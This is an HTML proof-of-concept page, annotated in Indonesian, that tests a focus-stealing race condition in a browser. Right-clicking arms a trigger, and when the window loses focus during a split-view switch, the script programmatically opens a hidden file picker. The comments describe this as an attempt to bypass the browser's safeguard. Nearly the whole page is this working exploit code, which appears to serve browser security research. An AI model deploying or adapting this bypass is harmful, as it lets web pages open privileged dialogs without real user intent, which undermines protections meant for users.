<!doctype html>
<html>
  <head>
    <title>POC: Focus-Stealing Race Condition (Refined)</title>
    <style>
      body {
        font-family: sans-serif;
        text-align: center;
        padding: 50px;
      }
      #link {
        padding: 30px;
        border: 3px solid green;
        cursor: pointer;
        display: inline-block;
        background: #f0fff0;
      }
      .status {
        margin-top: 20px;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <h2>Race Condition: Transition Test</h2>
    <p>Gunakan ini untuk mengetes tanpa terhalang file picker terus-menerus.</p>

    <div id="link">
      1. KLIK KANAN DI SINI <br />
      (Status: Ready)
    </div>

    <div id="status" class="status">Status: Idle</div>
    <input id="fileSelect" type="file" style="display: none" />

    <script>
      const link = document.getElementById("link");
      const fileSelect = document.getElementById("fileSelect");
      const status = document.getElementById("status");
      let isArmed = false;

      // Langkah 1: Persiapkan pemicu (Arming the trigger)
      link.addEventListener("contextmenu", function (e) {
        isArmed = true;
        link.style.borderColor = "red";
        link.innerText = "Skenario AKTIF! Sekarang coba buka Split View.";
        status.innerText = "Status: Menunggu transisi fokus (blur)...";

        // Memberikan jendela waktu 5 detik untuk kamu melakukan aksi split view
        setTimeout(() => {
          if (isArmed) {
            isArmed = false;
            status.innerText =
              "Status: Timeout (Gagal pindah fokus tepat waktu)";
            link.style.borderColor = "green";
          }
        }, 5000);
      });

      // Langkah 2: Pemicuan hanya terjadi saat fokus hilang (Blur)
      window.addEventListener("blur", () => {
        if (isArmed) {
          // Ini adalah momen krusial: saat kamu klik area split lain,
          // kita coba tembus pengaman browser.
          fileSelect.click();
          isArmed = false; // Matikan agar tidak mengganggu lagi
          status.innerText = "Status: Mencoba bypass saat transisi fokus!";
          console.log("Exploit attempt fired during blur event.");
        }
      });
    </script>
  </body>
</html>
